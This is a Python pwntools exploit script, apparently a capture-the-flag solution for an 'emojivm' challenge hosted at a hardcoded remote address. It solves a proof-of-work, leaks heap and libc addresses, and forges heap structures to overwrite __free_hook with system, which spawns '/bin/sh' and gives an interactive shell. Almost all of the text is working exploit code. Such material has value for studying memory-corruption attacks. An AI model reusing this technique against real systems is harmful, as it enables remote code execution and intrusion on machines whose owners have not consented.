from pwn import *

libc = ELF('./libc.so.6_18292bd12d37bfaf58e8dded9db7f1f5da1192cb')

context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

DEBUG = False

if DEBUG:
    p = process(['./emojivm', './test.evm'])
else:
    p = remote('3.115.176.164', 30262)
    p.recvline()
    hashcash_proc = process(p.recvline(False).split())
    p.recvuntil('hashcash token: ')
    p.sendline(hashcash_proc.recvline(False)[len('hashcash token: '):])
    p.recvuntil('Your emoji file size: ( MAX: 1000 bytes ) ')
    with open('./test.evm') as f:
        dat = f.read()
        p.sendline(str(len(dat)))
        p.recvline()
        p.send(dat)

p.recvlines(5)
alloc_higuard = int(p.recvline(False))
#alloc_100 = int(p.recvline(False))
#alloc_1100 = int(p.recvline(False))
#alloc_loguard = int(p.recvline(False))

# hardcoded offset
ofs_loguard = 94073091532880 - 0x0000558f1932f000  # 0x13850, 0
ofs_1100 = 94073091533024 - 0x0000558f1932f000     # 0x138e0, 1
ofs_100 = 94073091534176 - 0x0000558f1932f000      # 0x13d60, 2
ofs_higuard = 94073091534320 - 0x0000558f1932f000  # 0x13df0, 3, gptr overwritten

ofs_tmp = ofs_1100 + 0x20 + 0x100  # 0x13a00
ofs_100_to_tmp = ofs_tmp - ofs_100 # -0x360 == -864

heap_base = alloc_higuard - ofs_higuard
log.info('heap_base: 0x{:016x}'.format(heap_base))
assert(heap_base & 0xfff == 0)

if DEBUG:
    gdb.attach(p)

payload  = "A"*0x100
payload += p64(0x200) + p64(heap_base + ofs_1100 + 0x28)  # fake struct @ ofs_tmp pointing to ofs_1100_data + 8, prep libc leak
payload = payload.ljust(1100, 'B')
if '\n' in payload:
    log.warning('LF in payload!')
p.send(payload)

unsorted_bin_leak = p.recv(6)
assert(len(unsorted_bin_leak) == 6)
unsorted_bin_leak = u64(unsorted_bin_leak.ljust(8, '\x00'))
libc_base = unsorted_bin_leak - (0x7fa0dc6cbca0 - 0x7fa0dc2e0000)
log.info('libc_base: 0x{:016x}'.format(libc_base))
assert(libc_base & 0xfff == 0)

payload  = "A"*0x100
payload += p64(0x8) + p64(libc_base + libc.symbols['__free_hook'])  # fake struct @ ofs_tmp pointing to __free_hook
payload = payload.ljust(1100, 'B')
if '\n' in payload:
    log.warning('LF in payload!')
p.send(payload)

payload = "/bin/sh\0".ljust(100, '\0')
p.send(payload)

payload = p64(libc_base + libc.symbols['system'])
p.send(payload)

p.interactive()